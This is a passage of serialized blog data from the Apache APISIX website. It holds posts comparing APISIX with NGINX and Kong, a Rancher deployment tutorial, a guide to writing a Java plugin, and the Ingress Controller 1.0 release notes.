businesses.","date":"2021-06-28T00:00:00.000Z","formattedDate":"June 28, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.255,"truncated":true,"authors":[{"name":"Yuansheng Wang","url":"https://github.com/membphis","imageURL":"https://avatars.githubusercontent.com/u/6814606?v=4"}],"prevItem":{"title":"Release Apache APISIX 2.7.0","permalink":"/blog/2021/06/29/release-apache-apisix-2.7"},"nextItem":{"title":"Deploy APISIX and APISIX Ingress Controller on Rancher","permalink":"/blog/2021/06/23/deploy-great-open-source-gateway-and-ingress-controller-fast"}},"content":"> This article describes the history of the open source API Gateway Apache APISIX architecture\'s evolution and compares the advantages of the two frameworks, Apache APISIX and NGINX.\\n\\n\x3c!--truncate--\x3e\\n\\nAPI gateway is an important infrastructure component in the cloud-native era. There are two common criteria to evaluate an API gateway: how dynamic it is, and how mature its observability is. Many companies used to use NGINX or Kong as their API gateway, but then later switched to Apache APISIX. As an API gateway born for the cloud-native era, Apache APISIX indeed solves a lot of pain points for businesses in various dimensions. Now you might wonder, why?\\n\\n## NGINX and Kong\'s Limitations\\n\\nIn the era of monolithic services, NGINX can handle most scenarios. While in the cloud-native era, NGINX has two shortcomings due to its architecture:\\n\\n- NGINX does not support cluster management. Almost every company has its own NGINX configuration management system. Although the systems are similar, there is no unified solution.\\n- NGINX does not support hot reloading of configurations. If the user modifies the configuration of NGINX, it will be necessary to reload NGINX. Also, in Kubernetes, the services will change frequently. So if NGINX is used to handle the traffic, you must restart the service often, which is unacceptable for enterprises.\\n\\nKong solves the shortcomings of NGINX but brings new limitations:\\n\\n- Kong needs to rely on a PostgreSQL or Cassandra database, which makes Kong\'s entire architecture very bloated and would bring a high availability limitation to the enterprise. If the database fails, the whole API Gateway fails.\\n- Kong\'s routing uses traversal search. When there are more than a thousand routes in the gateway, its performance will dramatically drop.\\n\\nThe APISIX resolves all the above limitations and becomes the best API gateway in the cloud-native era.\\n\\n## Advantages of Apache APISIX\\n\\n### Well designed architecture\\n\\nFirst, Apache APISIX has an excellent architecture. Cloud-native, as the current technology trend, will change the technical architecture of traditional enterprises. Many applications are migrating to microservices and containerization. APISIX has followed the technology trend since its inception:\\n\\n![image](https://static.apiseven.com/2022/10/03/633a40c31bfe9.png)\\n\\nAs shown in the figure above, the left and right are the Data Plane and the Control Plane of APISIX:\\n\\n- Data Plane: Based on NGINX\'s network library (without using NGINX\'s route matching, static configuration, and C modules), it uses Lua and NGINX to dynamically control request traffic;\\n- Control Plane: Administrators can operate etcd through the built-in RESTful API. With the help of the etcd\'s Watch mechanism, APISIX can synchronize the configuration to each node within milliseconds.\\n\\nFor updating data, Kong uses the database polling method; it may take 5-10 seconds to get the latest configuration, while APISIX achieves the same by monitoring etcd configuration changes, which can control the time in milliseconds.\\n\\nSince both APISIX and etcd support multi-instance deployment, there is no single point of failure.\\n\\n### Rich ecosystem\\n\\nThe following figure shows the ecosystem map of APISIX. From this figure, we can see that APISIX supports L7 protocols including HTTP(S), HTTP2, Dubbo, IoT protocol MQTT, etc. In addition, APISIX supports L4 protocols such as TCP/UDP.\\n\\nThe right part of the figure contains some open-source or SaaS services, such as Apache SkyWalking, Prometheus, HashiCorp Vault, etc. At the bottom of the figure are the more common operating system environments, cloud vendors, and hardware environments. As an open-source software, APISIX can also be run on ARM64 servers.\\n\\n![image](https://static.apiseven.com/2022/10/03/633a40c2e47c3.png)\\n\\nAPISIX supports not only many protocols and operating systems but also supports [multi-language programming plugins](https://apisix.apache.org/docs/). When it first came out, APISIX only supported using the Lua language to write plugins. In this case, developers need to master the technology stack related to Lua and NGINX. However, Lua and NGINX are relatively niche technologies familiar to few developers. Therefore, we have then enabled plugin development on APISIX with multiple languages, and have officially supported languages such as [Java](https://apisix.apache.org/docs/java-plugin-runner/development/), [Golang](https://apisix.apache.org/docs/go-plugin-runner/getting-started/), Node.js, and [Python](https://apisix.apache.org/docs/python-plugin-runner/getting-started/).\\n\\n![image](https://static.apiseven.com/2022/10/03/633a3fc3ebe67.png)\\n\\n### Active community\\n\\nThe figure below is the contributor growth curve, where the horizontal axis represents the timeline, and the vertical axis represents the total number of contributors. We can see that the two projects, Apache APISIX and Kong, are relatively more active. Apache APISIX has maintained an excellent growth rate from the first day and is growing rapidly at a rate close to twice that of Kong. As of July 2022, the number of contributors to APISIX has exceeded Kong, which shows the popularity of APISIX. Of course, there are many other ways to evaluate the activity of a project, such as the monthly active issues, the total number of PRs, etc. The good news is that APISIX is also unrivaled in these aspects.\\n\\n![image](https://static.apiseven.com/2022/10/03/633a3fc6ef2f7.png)\\n\\n## Unified proxy infrastructure\\n\\nFrom the figure below, I believe you have already understood the goal of APISIX: unifying the proxy infrastructure.\\n\\n![image](https://static.apiseven.com/2022/10/03/633a40c31027f.png)\\n\\nBecause the core of APISIX is a high-performance proxy service, it does not bind any environment properties. Therefore, when it evolves into products such as Ingress and Service Mesh, you don\'t have to change the internal structure of APISIX. The following will introduce to you step-by-step how APISIX supports these scenarios.\\n\\n### Load balance and API gateway\\n\\nThe first is for traditional LB and API gateway scenarios. Because APISIX is implemented based on NGINX + LuaJIT, it has high-performance and security features, and supports the dynamically loading of an SSL certificate, SSL handshake optimization, and other functions. In terms of load balancing, APISIX also performs better. Switching from NGINX to APISIX will not degrade performance but rather improve management efficiency brought about by features such as unified management.\\n\\n### Microservice Gateway\\n\\nAPISIX allows you to write extension plugins in multiple languages, which can solve the main problem faced by east-west microservice API gateways - how to manage in a unified way in heterogeneous environments. APISIX also supports service discovery like Nacos, etcd and Eureka, and standard DNS methods, which can completely replace microservice API gateways such as Zuul, Spring Cloud Gateway, and Dubbo.\\n\\n### Kubernetes Ingress\\n\\nCurrently, the official Kubernetes Ingress Controller project of K8s is mainly developed based on the NGINX configuration file, so it is slightly insufficient in routing capability and loading mode and has some obvious limitations. For example, when adding or modifying any API, you need to restart the service to complete the update of the new NGINX configuration. Restarting the service has a great impact on online traffic.\\n\\nThe [APISIX Ingress Controller](https://apisix.apache.org/docs/ingress-controller/getting-started/) perfectly resolves all the limitations mentioned above: it supports fully hot reloading. At the same time, it inherits all the advantages of APISIX and also supports native Kubernetes CRD, which is convenient for users to migrate.\\n\\n![image](https://static.apiseven.com/2022/10/03/633a3fc73575c.png)\\n\\n### Service mesh\\n\\nIn the next five to ten years, the service mesh architecture based on the cloud-native model will begin to emerge. APISIX has also started to lock the track in advance. After abundant research and technical analysis, APISIX has supported the xDS protocol. APISIX Mesh was born, and APISIX also has a place in the field of service mesh.\\n\\n![image](https://static.apiseven.com/2022/10/03/633a3fc7373ff.png)\\n\\n## Summary\\n\\nIt has been three years since the first day Apache APISIX was open-sourced. The highly active community and [case studies](https://apisix.apache.org/blog/tags/case-studies/) have proved that APISIX is the perfect API gateway in the cloud-native era. By reading this article, I believe you have a more comprehensive understanding of APISIX.\\n\\nIf you have any questions, you can leave a message in [GitHub issue](https://github.com/apache/apisix/issues); community contributors will respond quickly; of course, you can also join the APISIX Slack channel and mailing list; please refer to [Join Us](https://apisix.apache.org/docs/general/join/)."},{"id":"Deploy APISIX and APISIX Ingress Controller on Rancher","metadata":{"permalink":"/blog/2021/06/23/deploy-great-open-source-gateway-and-ingress-controller-fast","source":"@site/blog/2021/06/23/deploy-great-open-source-gateway-and-ingress-controller-fast.md","title":"Deploy APISIX and APISIX Ingress Controller on Rancher","description":"Through the cloud-native API gateway Apache APISIX Helm repository, you can directly deploy Apache APISIX and APISIX Ingress controller in Rancher.","date":"2021-06-23T00:00:00.000Z","formattedDate":"June 23, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.655,"truncated":true,"authors":[{"name":"Jintao Zhang","url":"https://github.com/tao12345666333","imageURL":"https://avatars.githubusercontent.com/u/3264292?v=4"}],"prevItem":{"title":"Why would you choose Apache APISIX instead of NGINX or Kong?","permalink":"/blog/2021/06/28/why-we-need-apache-apisix"},"nextItem":{"title":"How to Write an Apache APISIX Plugin in Java","permalink":"/blog/2021/06/21/use-java-to-write-apache-apisix-plugins"}},"content":"> This article shows the procedure of installing and deploying Apache APISIX and Apache APISIX Ingress Controller in the Rancher App Store (Catalog), and how to proxy Kubernetes services through them.\\n\\n\x3c!--truncate--\x3e\\n\\n## Prerequisite\\n\\nExisting Kubernetes clusters are all hosted on Rancher.\\n\\n## Step 1: Configure Helm Chart in Rancher\\n\\nVisit Rancher\u2019s Tools \u2014 Catalogs page.\\n\\nClick \u201cEdit Catalog\u201d, enter https://github.com/apache/apisix-helm-chart in \u201cCatalog URL\u201d to add the Helm repository for Apache APISIX in Rancher.\\n\\n![2021-06-23-1](https://static.apiseven.com/202108/1639464984786-20a73a62-1e9d-463b-aac3-26ac18ab5228.png)\\n\\nClick \u201cSave\u201d to save the changes.\\n\\nSelect the Apps page, select Launch to see the Apache APISIX repository information. Here we can directly select \u201capisix\u201d to deploy Apache APISIX.\\n\\n![2021-06-23-2](https://static.apiseven.com/202108/1639465059361-aa11ab87-11f7-45b6-964f-d285d41e8a39.png)\\n\\n![2021-06-23-3](https://static.apiseven.com/202108/1639465129809-bf86383f-bab5-459d-bb02-e7d45e3b4c51.png)\\n\\nSince we want to **deploy APISIX Ingress controller at the same time**, fill in the `ingress-controller.enabled=true` in the Answers at the bottom. Then click \'Save\\" to complete the deployment.\\n\\n![2021-06-23-4](https://static.apiseven.com/202108/1639465197713-4ba6e7a2-8824-42e6-bf27-1d49f4e60ce5.png)\\n\\nWait a few moments for the deployment to complete.\\n\\n![2021-06-23-5](https://static.apiseven.com/202108/1639465259396-fc1104e9-289d-41b6-ae23-d6e05da066b1.png)\\n\\n## Step 2: Deploy an Example Project\\n\\nWe use `kennethreitz/httpbin` as a sample project for demonstration purpose. The deployment is also done directly in Rancher.\\n\\n![2021-06-23-6](https://static.apiseven.com/202108/1639465331864-d8160567-d30c-427a-b0e5-425df6657879.png)\\n\\n## Step 3: Use Apache APISIX as an API Gateway to Proxy Services\\n\\nFirst, We demonstrate how to use Apache APISIX as a gateway to proxy services in a Kubernetes cluster.\\n\\n```shell\\nroot@apisix:~$ kubectl -n apisix exec -it `kubectl -n apisix get pods -l app.kubernetes.io/name=apisix -o name` -- bash\\nbash-5.1# curl httpbin.default/get\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.default\\",\\n    \\"User-Agent\\": \\"curl/7.76.1\\"\\n  },\\n  \\"origin\\": \\"10.244.3.3\\",\\n  \\"url\\": \\"http://httpbin.default/get\\"\\n}\\n```\\n\\nYou can see that the sample project can be accessed normally from within the Apache APISIX Pod. Next, we use Apache APISIX to proxy the sample project.\\n\\nHere we use `curl` to call the admin interface of Apache APISIX to create a route. All requests with a host header of `httpbin.org` are forwarded to the actual application service `httpbin.default:80`.\\n\\n```shell\\nbash-5.1# curl \\"http://127.0.0.1:9180/apisix/admin/routes/1\\" -H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{\\n  \\"uri\\": \\"/*\\",\\n  \\"host\\": \\"httpbin.org\\",\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"httpbin.default:80\\": 1\\n    }\\n  }\\n}\'\\n{\\"action\\":\\"set\\",\\"node\\":{\\"value\\":{\\"uri\\":\\"\\\\/*\\",\\"create_time\\":1623834078,\\"update_time\\":1623834078,\\"priority\\":0,\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"hash_on\\":\\"vars\\",\\"pass_host\\":\\"pass\\",\\"nodes\\":{\\"httpbin.default:80\\":1},\\"scheme\\":\\"http\\"},\\"id\\":\\"1\\",\\"status\\":1,\\"host\\":\\"httpbin.org\\"},\\"key\\":\\"\\\\/apisix\\\\/routes\\\\/1\\"}}\\n```\\n\\nYou will get an output similar to the above code block. Next, verify that the proxy is successful.\\n\\n```shell\\nbash-5.1# curl http://127.0.0.1:9080/get -H \\"HOST: httpbin.org\\"\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.76.1\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  },\\n  \\"origin\\": \\"127.0.0.1\\",\\n  \\"url\\": \\"http://httpbin.org/get\\"\\n}\\n```\\n\\nThe above output shows that the sample project traffic has been proxied through Apache APISIX. Next, let\u2019s try accessing the sample project from outside the cluster via Apache APISIX.\\n\\n```shell\\nroot@apisix:~$ kubectl  -n apisix get svc -l app.kubernetes.io/name=apisix\\nNAME             TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\\napisix-admin     ClusterIP   10.96.142.88    <none>        9180/TCP       51m\\napisix-gateway   NodePort    10.96.158.192   <none>        80:32763/TCP   51m\\n```\\n\\nWhen deployed using Helm chart, the Apache APISIX port is exposed by default as a NodePort. We use the Node IP + NodePort port for access testing.\\n\\n```shell\\nroot@apisix:~$ curl http://172.18.0.2:32763/get -H \\"HOST: httpbin.org\\"\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.58.0\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  },\\n  \\"origin\\": \\"10.244.3.1\\",\\n  \\"url\\": \\"http://httpbin.org/get\\"\\n}\\n```\\n\\nAs you can see, **Apache APISIX is able to proxy services within a Kubernetes cluster outside the cluster**.\\n\\n## Step 4: Use Apache APISIX Ingress Controller Proxy Service\\n\\nWe can add Ingress directly to Rancher and the Apache APISIX Ingress controller will automatically synchronize the routing rules to Apache APISIX to complete the proxy for the service.\\n\\n![2021-06-23-7](https://static.apiseven.com/202108/1639465402058-3f41e8de-033b-4888-a835-30969251e402.png)\\n\\nNote in the bottom right corner, we have added the annotation configuration `kubernetes.io/ingress.class: apisix` to support multiple ingress-controller scenarios in the cluster.\\n\\nAfter saving, you can see the following screen.\\n\\n![2021-06-23-8](https://static.apiseven.com/202108/1639465466581-db8c19d7-9c8f-402c-9270-34e327908caa.png)\\n\\nTest if the proxy is successful under the terminal\uff1a\\n\\n```shell\\nroot@apisix:~$ curl http://172.18.0.2:32763/get -H \\"HOST: httpbin-ing.org\\"\\n{\\n  \\"args\\": {},\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Host\\": \\"httpbin-ing.org\\",\\n    \\"User-Agent\\": \\"curl/7.58.0\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin-ing.org\\"\\n  },\\n  \\"origin\\": \\"10.244.3.1\\",\\n  \\"url\\": \\"http://httpbin-ing.org/get\\"\\n}\\n```\\n\\nYou can see that it is also proxied properly.\\n\\nIn addition, the Apache APISIX Ingress controller extends Kubernetes by way of CRD, and you can also expose services in Kubernetes to the public by publishing custom resources like  `ApisixRoute`.\\n\\n## Conclusion\\n\\nYou can deploy Apache APISIX and APISIX Ingress controller directly in Rancher using the official Apache APISIX Helm repository. And Apache APISIX can be used as a gateway or as a data plane for the APISIX Ingress controller to carry business traffic.\\n\\n## Future Plans\\n\\nThe Rancher community has partnered with Apache APISIX community. You will be able to find Apache APISIX directly in Rancher\u2019s own app store in the future, eliminating the need to manually add Helm repositories."},{"id":"2021/06/21/use-java-to-write-apache-apisix-plugins","metadata":{"permalink":"/blog/2021/06/21/use-java-to-write-apache-apisix-plugins","source":"@site/blog/2021/06/21/use-Java-to-write-Apache-APISIX-plugins.md","title":"How to Write an Apache APISIX Plugin in Java","description":"The cloud native API Gateway Apache APISIX already supports Java to write plugins. Users can not only write plugins in Java language, but also integrate into the Spring Cloud ecosystem.","date":"2021-06-21T00:00:00.000Z","formattedDate":"June 21, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.58,"truncated":true,"authors":[{"name":"Zhengsong Tu","url":"https://github.com/tzssangglass","imageURL":"https://avatars.githubusercontent.com/u/30819887?v=4"}],"prevItem":{"title":"Deploy APISIX and APISIX Ingress Controller on Rancher","permalink":"/blog/2021/06/23/deploy-great-open-source-gateway-and-ingress-controller-fast"},"nextItem":{"title":"APISIX Ingress Controller 1.0 Release","permalink":"/blog/2021/06/18/first-ga-version-v1.0-of-apache-apisix-ingress-controller-released"}},"content":"> Apache APISIX now supports writing plugins in Java! You can now write plugins in a programming language you are familiar with.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\n### Why Apache APISIX Supports Writing Plugins in Multiple Programming Languages?\\n\\nApache APISIX has been supporting customized plugins since the day it was born. But it only supported plugins written in Lua. As a result, developers need to have Lua and OpenResty-related development skills to actually write their own plugins. However, Lua and OpenResty are relatively less popular languages with fewer developers compared to Java and Go. Besides, learning Lua and OpenResty from scratch requires a lot of time and effort.\\n\\nDuring technological selection, the most important consideration for the development team is whether the chosen product matches the team\'s technology stack. The niche technology stack limits Apache APISIX to become the first choice of API Gateway product in many scenarios.\\n\\nNow, Apache APISIX supports multi-language development plugins. More importantly, the development ecosystem where the language is supported, so users can use their familiar technology stack to develop Apache APISIX. With Apache APISIX supporting plugins written in Java, for example, users can not only write plugins in Java but also integrate into the Spring Cloud ecosystem and use a wide range of technical components within the ecosystem.\\n\\n### Multiple Programming Languages Architecture Diagram\\n\\n![Multiple Programming Languages Architecture Diagram](https://static.apiseven.com/202108/1639464774923-50cebc94-6344-4ea6-88a6-2b424c5f8567.png)\\n\\nThe left side of the diagram shows the workflow of Apache APISIX. The right side of the diagram is the plugin runner, which is a generic term for projects with multiple programming languages support. The apisix-java-plugin-runner is a plugin runner that supports the Java language.\\n\\nWhen you configure a plugin runner in Apache APISIX, Apache APISIX starts a subprocess to run the plugin runner, which belongs to the same user as the Apache APISIX process. When we restart or reload Apache APISIX, the plugin runner will also be restarted.\\n\\nIf you configure the ext-plugin-* plugin for a given route, a request hitting that route will trigger Apache APISIX to perform an RPC call to the plugin runner via a Unix socket. The call is broken down into two phases:\\n\\n- ext-plugin-pre-req: Before executing the Apache APISIX built-in plugin (Lua plugin)\\n- ext-plugin-post-req: After executing the Apache APISIX built-in plugin (Lua plugin)\\n\\nPlease configure the timing of the plugin runner execution as needed.\\nThe plugin runner processes the RPC call, creates a simulated request inside it, and then runs the multiple programming languages written a plugin and returns the result to Apache APISIX.\\n\\nThe order of execution of multiple programming languages plugins is defined in the ext-plugin-* plugin configuration entry. Like other plugins, they can be enabled and redefined on the fly.\\n\\n## Building Development Environment\\n\\nFirst, you need to build the Apache APISIX runtime or development environment, please refer to [Build Apache APISIX](https://github.com/apache/apisix/blob/master/docs/en/latest/building-apisix.md), and [Build apisix-java-plugin-runner](https://github.com/apache/apisix-java-plugin-runner/blob/main/docs/en/latest/development.md).\\n\\nNote: Apache APISIX and apisix-java-plugin-runner need to be located on the same instance.\\n\\n## Enabling Debug\xa0Mode\\n\\n### Configuring Apache APISIX into Debug\xa0Mode\\n\\nWhen Apache APISIX is configured into debug mode, it is allowed to run external plugins in a debugging manner. Add the following configuration to `config.yaml` to enable debug mode for Apache APISIX.\\n\\n```text\\next-plugin:\\n  path_for_test: /tmp/runner.sock\\n```\\n\\nThe configuration above means that Apache APISIX acts as the client and listens to the Unix Domain Socket link located at `/tmp/runner.sock`.\\n\\n### Setting apisix-java-plugin-runner to Debug\xa0Mode\\n\\nBefore starting the `Mainclass(org.apache.apisix.plugin.runner.PluginRunnerApplication)`, you need to configure the user-level environment variables `APISIX_LISTEN_ADDRESS=unix:/tmp/runner.sock and APISIX_CONF_EXPIRE_TIME=3600`.\\n\\nIf you are using IDEA for development, the configured environment variables are shown below.\\n\\n![configured environment](https://static.apiseven.com/202108/1639464890287-ee6bbc3a-3f8b-4de7-9ce4-7670fb0c3f64.png)\\n\\napisix-java-plugin-runner is equivalent to the server side and will actively create the `/tmp/runner.sock` file at startup and communicate with Apache APISIX on this file for Unix Domain Socket.\\n\\n## How to Develop a Java Plugin for Apache\xa0APISIX?\\n\\n### Scenario\\n\\nLet\'s say we have a scenario like this: we need to verify the validity of the token in the request header. The way to verify the token is to carry the token as a parameter in the request and access the SSO fixed interface.\\n\\n### Configuring Apache\xa0APISIX\\n\\nFirst, name the plugin `TokenValidator`, and then design the properties. In order to achieve dynamic configuration as far as possible, the properties are designed as follows.\\n\\n```json\\n{\\n  \\"validate_header\\": \\"token\\",\\n  \\"validate_url\\": \\"https://www.sso.foo.com/token/validate\\",\\n  \\"rejected_code\\": \\"403\\"\\n}\\n```\\n\\nStart Apache APISIX, then add a new route configuration specifying that the route requires a call to apisix-java-plugin-runner\'s `TokenValidator` plugin, as shown in the following example.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/get\\",\\n    \\"plugins\\":{\\n        \\"ext-plugin-pre-req\\":{\\n            \\"conf\\":[\\n                {\\n                    \\"name\\":\\"TokenValidator\\",\\n                    \\"value\\":\\"{\\\\\\"validate_header\\\\\\":\\\\\\"token\\\\\\",\\\\\\"validate_url\\\\\\":\\\\\\"https://www.sso.foo.com/token/validate\\\\\\",\\\\\\"rejected_code\\\\\\":\\\\\\"403\\\\\\"}\\"\\n                }\\n            ]\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        },\\n        \\"type\\":\\"roundrobin\\"\\n    }\\n}\\n```\\n\\nNote that the properties of `TokenValidator` need to be escaped by json and configured as string type (the upstream address here is configured as httpbin.org to simplify the debugging process).\\n\\n### Developing a Java\xa0Plugin\\n\\nAdd `TokenValidatr.java` with the following initial code skeleton In the `runner-plugin/src/main/java/org/apache/apisix/plugin/runner/filter` directory.\\n\\n```Java\\npackage org.apache.apisix.plugin.runner.filter;\\n\\nimport org.apache.apisix.plugin.runner.HttpRequest;\\nimport org.apache.apisix.plugin.runner.HttpResponse;\\nimport org.springframework.stereotype.Component;\\nimport reactor.core.publisher.Mono;\\n\\n\\n@Component\\npublic class TokenValidator implements PluginFilter {\\n\\n    @Override\\n    public String name() {\\n        return \\"TokenValidator\\";\\n    }\\n\\n    @Override\\n    public Mono<Void> filter(HttpRequest request, HttpResponse response, PluginFilterChain chain) {\\n        return chain.filter(request, response);\\n    }\\n}\\n```\\n\\nThis plugin inherits the `PluginFilter` interface and overrides the `name` and the `filter` function. Rewrite the return value of `name` to be consistent with \\"name\\" in the route attribute of APISIX configuration earlier. The complete code is as follows.\\n\\n```Java\\npackage org.apache.apisix.plugin.runner.filter;\\n\\nimport com.google.gson.Gson;\\nimport org.apache.apisix.plugin.runner.HttpRequest;\\nimport org.apache.apisix.plugin.runner.HttpResponse;\\nimport org.springframework.stereotype.Component;\\nimport reactor.core.publisher.Mono;\\n\\nimport java.util.HashMap;\\nimport java.util.Map;\\n\\n@Component\\npublic class TokenValidator implements PluginFilter {\\n\\n    @Override\\n    public String name() {\\n        return \\"TokenValidator\\";\\n    }\\n\\n    @Override\\n    public Mono<Void> filter(HttpRequest request, HttpResponse response, PluginFilterChain chain) {\\n        // parse `conf` to json\\n        String configStr = request.getConfig(this);\\n        Gson gson = new Gson();\\n        Map<String, Object> conf = new HashMap<>();\\n        conf = gson.fromJson(configStr, conf.getClass());\\n\\n        // get configuration parameters\\n        String token = request.getHeader((String) conf.get(\\"validate_header\\"));\\n        String validate_url = (String) conf.get(\\"validate_url\\");\\n        boolean flag = validate(token, validate_url);\\n\\n        // token verification results\\n        if (!flag) {\\n            String rejected_code = (String) conf.get(\\"rejected_code\\");\\n            response.setStatusCode(Integer.parseInt(rejected_code));\\n            return chain.filter(request, response);\\n        }\\n\\n        return chain.filter(request, response);\\n    }\\n\\n    private Boolean validate(String token, String validate_url) {\\n        //TODO: improve the validation process\\n        return true;\\n    }\\n}\\n```\\n\\n### Testing the\xa0Plugin\\n\\nThe upstream service configured on Apache APISIX is httpbin.org, which allows you to access Apache APISIX, trigger the route, and have Apache APISIX call apisix-java-plugin-runner to execute the TokenValidator plugin and test the functionality of the Java plugin.\\n\\n```shell\\ncurl -H \'token: 123456\' 127.0.0.1:9080/get\\n{\\n \\"args\\": {},\\n \\"headers\\": {\\n \\"Accept\\": \\"/\\",\\n \\"Host\\": \\"127.0.0.1\\",\\n \\"Token\\": \\"123456\\",\\n \\"User-Agent\\": \\"curl/7.71.1\\",\\n \\"X-Amzn-Trace-Id\\": \\"Root=1-60cb0424-02b5bf804cfeab5252392f96\\",\\n \\"X-Forwarded-Host\\": \\"127.0.0.1\\"\\n },\\n \\"origin\\": \\"127.0.0.1\\",\\n \\"url\\": \\"http://127.0.0.1/get\\"\\n}\\n```\\n\\n## Deploying the\xa0Plugin\\n\\nAfter the development of the plugin is completed, the deployment operation can be found in referred to [Deploying apisix-java-plugin-runner](https://github.com/apache/apisix-java-plugin-runner/blob/main/docs/how-it-works.md#run).\\n\\n## Video Tutorial\\n\\n<iframe\\n    height=\\"350\\"\\n    width=\\"600\\"\\n    src=\\"https://api7-website-1301662268.file.myqcloud.com/2021-06-21-use-Java-to-write-Apache-APISIX-plugins.mp4\\"\\n    frameborder=\\"0\\">\\n</iframe>"},{"id":"2021/06/18/first-ga-version-v1.0-of-apache-apisix-ingress-controller-released","metadata":{"permalink":"/blog/2021/06/18/first-ga-version-v1.0-of-apache-apisix-ingress-controller-released","source":"@site/blog/2021/06/18/first-GA-version-v1.0-of-Apache-APISIX-Ingress-Controller-released.md","title":"APISIX Ingress Controller 1.0 Release","description":"Apache APISIX Ingress Controller released, supports resources such as ApisixRoute and ApisixUpstream, and also supports control of external traffic.","date":"2021-06-18T00:00:00.000Z","formattedDate":"June 18, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.775,"truncated":true,"authors":[{"name":"Jintao Zhang","url":"https://github.com/tao12345666333","imageURL":"https://avatars.githubusercontent.com/u/3264292?v=4"}],"prevItem":{"title":"How to Write an Apache APISIX Plugin in Java","permalink":"/blog/2021/06/21/use-java-to-write-apache-apisix-plugins"},"nextItem":{"title":"APISIX Dashboard Access Control Bypass Vulnerability Advisory (CVE-2021-33190)","permalink":"/blog/2021/06/17/apache-apisix-dashboard-access-control-bypass-vulnerability-announcement"}},"content":"> Apache APISIX Ingress Controller v1.0 has been released, supporting the use of custom resources including `ApisixRoute`, `ApisixUpstream`, and Kubernetes native Ingress resources to control external traffic access to services deployed in Kubernetes. services deployed in Kubernetes.\\n\\n\x3c!--truncate--\x3e\\n\\n## About Apache APISIX Ingress Controller\\n\\nThe Apache APISIX Ingress Controller is a cloud-native Ingress Controller implementation that uses Apache APISIX as a data plane to carry traffic and extends Kubernetes using CRD.\\n\\n\x3c!--truncate--\x3e\\n\\nSupports controlling external traffic access to services deployed in Kubernetes using custom resources including ApisixRoute, ApisixUpstream, and Kubernetes-native Ingress resources.\\n\\nThe overall architecture is as follows.\\n\\n![Apache APISIX Ingress Controller Architecture Diagram](https://static.apiseven.com/202108/1639464578081-06d7c64a-b597-444f-a59f-0217676e1ffc.png)\\n\\n## v1.0 latest features\\n\\n### Add ApisixConsumer custom resource to make configuration authentication more convenient\\n\\nIn the previous version, if you want to configure keyAuth or basicAuth, you need to manually call Apache APISIX admin api to create consumer configuration.\\n\\nIn v1.0, we added the `ApisixConsumer` resource, which allows users to define consumer resources and configure authentication for ApisixRoute in a more native way.\\n\\nFor example, a keyAuth resource is defined with the following configuration.\\n\\n```yaml\\napiVersion: apisix.apache.org/v2alpha1\\nkind: ApisixConsumer\\nmetadata:\\n  name: keyauth\\nspec:\\n  authParameter:\\n    keyAuth:\\n      value:\\n        key: API\\n```\\n\\nIn ApisixRoute you only need to add the corresponding type of `authentication` configuration.\\n\\n```yaml\\napiVersion: apisix.apache.org/v2alpha1\\nkind: ApisixRoute\\nmetadata:\\n  name: httpbin-route\\nspec:\\n  http:\\n   ...\\n   authentication:\\n     enable: true\\n     type: keyAuth\\n```\\n\\n### Adding mTLS support to ApisixTls\\n\\nIn v1.0 we also added mTLS support for ApisixTls custom resources, just add the client configuration to the ApisixTls resource configuration, e.g.\\n\\n```yaml\\napiVersion: apisix.apache.org/v1\\nkind: ApisixTls\\nmetadata:\\n  name: sample-tls\\nspec:\\n  ...\\n  client:\\n    ... client: caSecret:\\n      name: client-ca-secret\\n      namespace: default\\n````\\n\\n### Added more annotations to the native Ingress resource to enrich its functionality\\n\\n- `k8s.apisix.apache.org/blocklist-source-range` to restrict the source IP.\\n- `k8s.apisix.apache.org/rewrite-target` and `k8s.apisix.apache.org/rewrite-target-regex` to perform target rewrite operations.\\n- `k8s.apisix.apache.org/http-to-https` to perform HTTP to HTTPS forced redirects.\\n\\nSee the project [CHANGELOG](https://github.com/apache/apisix-ingress-controller/blob/master/CHANGELOG.md) for more feature changes.\\n\\n## Why use APISIX Ingress Controller\\n\\nApache APISIX Ingress Controller uses Apache APISIX as its data plane to carry business traffic, so it inherits the following advantages from Apache APISIX.\\n\\n- **High Performance & Stability**: Apache APISIX is a cloud-native high-performance dynamic API gateway that has been used in many enterprise large-scale traffic scenarios, and its performance and stability have been tested for a long time.\\n- **Rich ecology**: Apache APISIX is currently the most active open source gateway project, as the top project of Apache, both the community activity and its plug-in ecology are very rich, can meet the user\'s multiple use scenarios and needs.\\n\\nIn addition, because APISIX Ingress Controller also has the following unique advantages.\\n\\n- **Good compatibility**: supports multiple Ingress resource versions and works fine in different Kubernetes versions.\\n- **Dynamic updates**: Both Ingress resources and configuration updates such as certificates are hot loaded without reload, ensuring smooth business operation.\\n- **Flexible Scalability**: Since APISIX Ingress Controller adopts the architecture of 